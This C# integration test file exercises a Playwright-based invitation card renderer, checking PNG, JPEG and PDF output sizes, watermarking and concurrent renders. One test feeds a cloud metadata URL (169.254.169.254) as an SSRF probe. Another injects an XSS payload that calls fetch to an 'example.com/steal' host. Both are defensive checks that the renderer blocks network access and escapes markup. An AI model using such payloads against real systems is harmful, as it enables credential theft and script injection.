using System.Text.Json;
using InviteCraft.Application.Common.Interfaces;
using InviteCraft.Application.Features.Invitations;
using InviteCraft.Application.Features.Rendering;
using InviteCraft.Application.Features.Templates;
using InviteCraft.Domain.Enums;
using InviteCraft.Infrastructure.Rendering;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;

namespace InviteCraft.IntegrationTests.Rendering;

/// <summary>
/// Draws real cards with a real browser. Skipped automatically where Chrome is not installed (set <c>CHROME_PATH</c> to point at it);
/// the unit tests cover the same logic with a fake renderer.
/// </summary>
public sealed class PlaywrightCardRendererTests : IAsyncLifetime
{
    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    private static readonly string? Chrome = new[]
    {
        Environment.GetEnvironmentVariable("CHROME_PATH"),
        @"C:\Program Files\Google\Chrome\Application\chrome.exe",
        @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        "/usr/bin/google-chrome", "/usr/bin/chromium", "/usr/bin/chromium-browser",
    }.FirstOrDefault(path => !string.IsNullOrEmpty(path) && File.Exists(path));

    private readonly InMemoryStorage _storage = new();
    private PlaywrightCardRenderer? _renderer;

    public ValueTask InitializeAsync()
    {
        if (Chrome is not null)
            _renderer = new PlaywrightCardRenderer(_storage, Options.Create(new RenderSettings { BrowserPath = Chrome, NoSandbox = OperatingSystem.IsLinux(), TimeoutSeconds = 60 }),
                NullLogger<PlaywrightCardRenderer>.Instance);
        return ValueTask.CompletedTask;
    }

    public async ValueTask DisposeAsync()
    {
        if (_renderer is not null) await _renderer.DisposeAsync();
    }

    /// <summary>127 × 178 mm card: a solid maroon background colour, one fixed text layer, one editable field.</summary>
    private static TemplateDetailDto Template(string? externalImage = null)
    {
        var layers = externalImage is null
            ? ""
            : $$""", {"id":"remote","type":"image","frame":{"x":0,"y":0,"w":0.2,"h":0.2,"rotation":0},"zIndex":1,"opacity":1,"assetId":"00000000-0000-7000-8000-000000000009"}""";
        var json = $$$"""
        {
          "id":"00000000-0000-7000-8000-000000000001","code":"IC-TEST","name":"Test","slug":"test","tier":"Premium","orientation":"Portrait",
          "widthMm":127,"heightMm":178,"dpi":300,"bleedMm":3,"supportedLanguages":["en"],"tags":[],"layoutVersion":1,
          "design":{"schemaVersion":1,"canvas":{"backgroundColor":"#7A1427"},"pages":[{"index":0,"background":{"color":"#7A1427","fit":"cover"},
            "layers":[{"id":"title","type":"text","frame":{"x":0.1,"y":0.1,"w":0.8,"h":0.1,"rotation":0},"zIndex":5,"opacity":1,"text":"Together with their families",
              "style":{"fontSizePt":14,"color":"#FFFFFF","align":"center","lineHeight":1.2,"letterSpacing":0,"fontWeight":400,"italic":false,"textTransform":"none","autoShrink":true}}{{{layers}}}]}]},
          "fields":[{"fieldKey":"bride","label":"Bride","fieldType":"Text","isRequired":true,"pageIndex":0,
            "frame":{"x":0.1,"y":0.4,"w":0.8,"h":0.1,"rotation":0},"zIndex":10,
            "style":{"fontSizePt":30,"color":"#F3D98A","align":"center","lineHeight":1,"letterSpacing":0,"fontWeight":400,"italic":false,"textTransform":"none","autoShrink":true},
            "permissions":{"canChangeFont":true,"canChangeSize":true,"canChangeColor":true,"canChangeAlign":true,"canMove":false},"sortOrder":0,"isActive":true}],
          "fonts":[],"assets":[{"id":"00000000-0000-7000-8000-000000000009","assetType":"Background","webUrl":"{{{externalImage ?? ""}}}","sizeBytes":0,"mimeType":"image/png"}],"pricing":[]
        }
        """;
        return JsonSerializer.Deserialize<TemplateDetailDto>(json, TemplateJson.Options)!;
    }

    private static CardRenderRequest Request(DownloadFormat format, int dpi, WatermarkSpec? watermark = null, TemplateDetailDto? template = null) => new(
        template ?? Template(), "en", 0,
        new Dictionary<string, RenderValue> { ["bride"] = new("Ananya", null, null, null) }, format, dpi, watermark);

    private static (int W, int H) PngSize(byte[] b) => ((b[16] << 24) | (b[17] << 16) | (b[18] << 8) | b[19], (b[20] << 24) | (b[21] << 16) | (b[22] << 8) | b[23]);

    [Fact]
    public async Task A_png_is_drawn_at_the_requested_density()
    {
        Assert.SkipUnless(_renderer is not null, "Chrome is not installed.");

        var file = await _renderer!.RenderAsync(Request(DownloadFormat.Png, 300), Ct);

        file.ContentType.ShouldBe("image/png");
        PngSize(file.Content).ShouldBe((1500, 2100));
        (file.WidthPx, file.HeightPx).ShouldBe((1500, 2100));
    }

    [Fact]
    public async Task A_jpeg_preview_with_a_watermark_is_smaller_in_pixels_and_is_a_valid_jpeg()
    {
        Assert.SkipUnless(_renderer is not null, "Chrome is not installed.");

        var clean = await _renderer!.RenderAsync(Request(DownloadFormat.Jpg, 96), Ct);
        var marked = await _renderer.RenderAsync(Request(DownloadFormat.Jpg, 96, new WatermarkSpec("Preview", 0.3m)), Ct);

        clean.Content[..2].ShouldBe([(byte)0xFF, (byte)0xD8]);
        (clean.WidthPx, clean.HeightPx).ShouldBe((480, 672));
        marked.Content.SequenceEqual(clean.Content).ShouldBeFalse("the watermark must change the pixels");
    }

    [Fact]
    public async Task Pdfs_are_vector_documents_at_the_cards_physical_size_and_print_pdfs_add_bleed_and_margins()
    {
        Assert.SkipUnless(_renderer is not null, "Chrome is not installed.");

        var pdf = await _renderer!.RenderAsync(Request(DownloadFormat.Pdf, 300), Ct);
        var print = await _renderer.RenderAsync(Request(DownloadFormat.PrintPdf, 300), Ct);

        System.Text.Encoding.ASCII.GetString(pdf.Content, 0, 5).ShouldBe("%PDF-");
        var (pdfWidth, pdfHeight) = MediaBoxMm(pdf.Content);
        pdfWidth.ShouldBe(127, 1);
        pdfHeight.ShouldBe(178, 1);

        var (printWidth, printHeight) = MediaBoxMm(print.Content); // + 2 × (3 mm bleed + 8 mm margin)
        printWidth.ShouldBe(149, 1);
        printHeight.ShouldBe(200, 1);
    }

    [Fact]
    public async Task The_page_cannot_reach_the_network_so_card_content_can_never_make_the_server_fetch_a_url()
    {
        Assert.SkipUnless(_renderer is not null, "Chrome is not installed.");

        // The design references an image on an external host; the interceptor blocks it, the render still succeeds.
        var file = await _renderer!.RenderAsync(Request(DownloadFormat.Png, 96, template: Template("http://169.254.169.254/latest/meta-data/")), Ct);

        file.Content.Length.ShouldBeGreaterThan(1000);
        _storage.Reads.ShouldBeEmpty();
    }

    [Fact]
    public async Task Text_in_the_values_is_drawn_as_text_not_interpreted_as_markup()
    {
        Assert.SkipUnless(_renderer is not null, "Chrome is not installed.");

        var request = Request(DownloadFormat.Png, 96) with
        {
            Values = new Dictionary<string, RenderValue> { ["bride"] = new("<img src=x onerror=fetch('http://example.com/steal')><script>document.title='x'</script>", null, null, null) },
        };

        var file = await _renderer!.RenderAsync(request, Ct);

        file.Content.Length.ShouldBeGreaterThan(1000); // rendered fine; the markup was just text
    }

    [Fact]
    public async Task Several_renders_can_run_at_once()
    {
        Assert.SkipUnless(_renderer is not null, "Chrome is not installed.");

        var files = await Task.WhenAll(Enumerable.Range(0, 4).Select(_ => _renderer!.RenderAsync(Request(DownloadFormat.Jpg, 96), Ct)));

        files.ShouldAllBe(f => f.Content.Length > 1000);
    }

    private static (double W, double H) MediaBoxMm(byte[] pdf)
    {
        var text = System.Text.Encoding.Latin1.GetString(pdf);
        var match = System.Text.RegularExpressions.Regex.Match(text, @"/MediaBox\s*\[\s*0\s+0\s+([\d.]+)\s+([\d.]+)\s*\]");
        match.Success.ShouldBeTrue("no MediaBox found");
        return (double.Parse(match.Groups[1].Value, System.Globalization.CultureInfo.InvariantCulture) / 72 * 25.4,
                double.Parse(match.Groups[2].Value, System.Globalization.CultureInfo.InvariantCulture) / 72 * 25.4);
    }

    private sealed class InMemoryStorage : IFileStorage
    {
        public List<string> Reads { get; } = [];
        public Task SaveAsync(string key, Stream content, string contentType, CancellationToken cancellationToken = default) => Task.CompletedTask;
        public Task<Stream?> OpenReadAsync(string key, CancellationToken cancellationToken = default) { Reads.Add(key); return Task.FromResult<Stream?>(null); }
        public Task<bool> ExistsAsync(string key, CancellationToken cancellationToken = default) => Task.FromResult(false);
        public Task DeleteAsync(string key, CancellationToken cancellationToken = default) => Task.CompletedTask;
        public Task DeletePrefixAsync(string prefix, CancellationToken cancellationToken = default) => Task.CompletedTask;
        public string? GetPublicUrl(string key) => key.StartsWith("public/", StringComparison.Ordinal) ? "/media/" + key[7..] : null;
    }
}
